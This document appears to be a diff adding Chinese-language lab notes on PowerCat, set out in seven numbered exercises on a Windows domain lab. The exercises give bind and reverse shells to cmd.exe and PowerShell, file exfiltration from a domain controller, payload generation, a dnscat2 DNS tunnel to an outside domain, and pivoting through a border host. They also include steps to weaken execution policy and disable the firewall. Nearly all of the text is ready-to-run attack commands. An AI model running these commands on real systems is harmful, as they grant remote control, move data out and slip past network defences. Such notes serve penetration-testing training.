@@ -1,0 +1,90 @@
+实例1：通过nc正向连接PowerCat
+Win7
+复制powercat.ps1到C:\Windows\system32目录
+用管理员打开PowerShell
+切换到C:\Windows\system32目录
+Set-ExecutionPolicy RemoteSigned
+输入Y
+IEX (New-Object System.Net.Webclient).DownloadString('.\powercat.ps1')
+powercat -l -p 1111 -e cmd.exe -v
+
+VPS
+nc -vv 2.2.2.101 1111 
+whoami
+ipconfig
+-----------------------------------------------------------------------------------------------------
+实例2：通过nc反向连接PowerCat
+VPS
+nc -nlp 2222 
+
+Win7
+IEX (New-Object System.Net.Webclient).DownloadString('.\powercat.ps1')
+powercat -c 2.2.2.10 2222 -v -e cmd.exe
+-----------------------------------------------------------------------------------------------------
+实例3：通过Powercat返回PowerShell
+Win7
+powercat -l -p 3333 –v
+whoami
+ipconfig
+
+DC
+IEX (New-Object System.Net.Webclient).DownloadString('.\powercat.ps1’)
+powercat -c 192.168.123.101 -p 3333 -ep
+-----------------------------------------------------------------------------------------------------
+实例4：通过PowerCat传输文件
+Win7SP1
+powercat -l -p 4444 -of 123.txt -v(第2步)
+目录C:\Users\zhangsan下去找123.txt文件(第5步)
+
+DC
+在C盘建立1个123.txt的文件，例如可以写上内容I am DC（第1步）
+IEX (New-Object System.Net.Webclient).DownloadString('powercat.ps1’)
+powercat -c 192.168.123.101 -p 4444 -i c:\123.txt –v （第3步）
+    i love study  (第4步)
+
+
+-----------------------------------------------------------------------------------------------------
+实例5：用PowerCat生成Payload
+Win7
+IEX (New-Object System.Net.Webclient).DownloadString('powercat.ps1')
+powercat -l -p 5555 -e cmd -v -g >> shell.ps1（第1步）
+
+powercat -c 192.168.123.100 -p 5555 -v（第3步）
+
+DC
+将shell.ps1上传到Win Server 2012(DC) ，并且执行(第2步)
+如果脚本执行不了，请输入在管理员的PowerShell下执行
+set-executionpolicy remotesigned
+需要控制界面--系统安全--防火墙-关闭防火墙才行
+-----------------------------------------------------------------------------------------------------
+实例6：PowerCat DNS隧道通信
+Border
+apt-get -y install ruby-dev git make g++
+gem install bundler
+手动下载
+https://codeload.github.com/iagox86/dnscat2/zip/refs/heads/master
+git克隆下载
+git clone https://github.com/iagox86/dnscat2
+复制到kali的/root下
+unzip dnscat2-master.zip
+cd /root/dnscat2-master/server
+bundle install
+ruby dnscat2.rb vpn.wulongcha.xyz -e open --no-cache
+
+session -i 1
+whoami
+
+Win7SP1(Border器)
+IEX (New-Object System.Net.Webclient).DownloadString('powercat.ps1')
+powercat -c 192.168.123.123 -p 53 -dns vpn.wulongcha.xyz -e cmd.exe 
+
+-----------------------------------------------------------------------------------------------------
+实例7:将PowerCat作为跳板
+VPS（记得切换网络，才能安装dnscat2）
+ruby dnscat2.rb abc.com -e open --no-cache
+ Win7SP1(Border)
+IEX (New-Object System.Net.Webclient).DownloadString('powercat.ps1')
+powercat -l -p 8000 -r dns:2.2.2.10::abc.com
+Win Server 2012(DC)
+ IEX (New-Object System.Net.Webclient).DownloadString('powercat.ps1')
+powercat -c 192.168.123.101 -p 8000 -v -e cmd.exe
